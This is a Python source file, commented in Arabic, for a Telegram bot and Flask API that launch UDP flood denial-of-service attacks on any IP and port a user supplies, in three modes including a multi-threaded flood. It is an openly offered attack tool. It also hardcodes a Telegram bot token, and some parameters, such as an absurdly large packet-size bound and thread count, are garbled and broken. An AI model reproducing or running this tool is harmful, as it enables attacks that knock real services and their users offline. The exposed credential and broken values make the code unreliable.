from flask import Flask, request, jsonify
import telebot
import socket
import threading
import time
import os
import random

# إعداد التوكن والبوت
BOT_TOKEN = "8178180692:AAEFr684iK5RUIRPOwdZ_O9vEJ4dMziiswo"
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# هجوم بسيط: إرسال حزم عشوائية
def flood_udp(ip, port, duration, random_size=False):
    end_time = time.time() + duration
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while time.time() < end_time:
            size = random.randint(100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 65507) if random_size else 65507
            data = os.urandom(size)
            s.sendto(data, (ip, port))

# هجوم متعدد: تنفيذ عدة خيوط متزامنة
def multi_threaded_flood(ip, port, duration, threads=10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, random_size=True):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=flood_udp, args=(ip, port, duration, random_size))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

# هجوم شامل: إرسال حزم ضخمة باستمرار
def massive_attack(ip, port, duration):
    end_time = time.time() + duration
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while time.time() < end_time:
            size = random.randint(60000, 65507)
            data = os.urandom(size)
            s.sendto(data, (ip, port))

# واجهة API لتنفيذ الهجوم
@app.route('/attack', methods=['POST'])
def api_attack():
    try:
        data = request.get_json()
        ip = data['ip']
        port = int(data['port'])
        duration = int(data['duration'])
        attack_type = int(data['type'])

        if attack_type == 1:
            flood_udp(ip, port, duration, random_size=True)
            return jsonify({"status": "success", "message": "Simple attack started."})
        elif attack_type == 2:
            threads = data.get('threads', 10)
            multi_threaded_flood(ip, port, duration, threads, random_size=True)
            return jsonify({"status": "success", "message": f"Multi-threaded attack started with {threads} threads."})
        elif attack_type == 3:
            massive_attack(ip, port, duration)
            return jsonify({"status": "success", "message": "Massive attack started."})
        else:
            return jsonify({"status": "error", "message": "Invalid attack type."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# رسالة الترحيب للبوت
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "مرحبًا بك! أنا بوت تنفيذ الهجمات. استخدم الأوامر التالية:\n"
                          "/attack IP:PORT DURATION TYPE\n\n"
                          "الأنواع المتاحة:\n"
                          "1 - هجوم بسيط\n"
                          "2 - هجوم متعدد\n"
                          "3 - هجوم شامل\n")

# تنفيذ الهجوم عبر البوت
@bot.message_handler(commands=['attack'])
def execute_attack(message):
    try:
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "صيغة الأمر غير صحيحة. الصيغة الصحيحة:\n/attack IP:PORT DURATION TYPE")
            return

        target = args[1]
        duration = int(args[2])
        attack_type = int(args[3])

        ip, port = target.split(":")
        port = int(port)

        if attack_type == 1:
            bot.reply_to(message, "بدء الهجوم البسيط...")
            flood_udp(ip, port, duration, random_size=True)
        elif attack_type == 2:
            bot.reply_to(message, "بدء الهجوم المتعدد بـ 10 خيوط...")
            multi_threaded_flood(ip, port, duration, threads=10, random_size=True)
        elif attack_type == 3:
            bot.reply_to(message, "بدء الهجوم الشامل...")
            massive_attack(ip, port, duration)
        else:
            bot.reply_to(message, "نوع الهجوم غير صحيح.")
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {e}")

# تشغيل البوت في خيط منفصل
def run_bot():
    bot.polling()

# تشغيل Flask API
if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=5000)
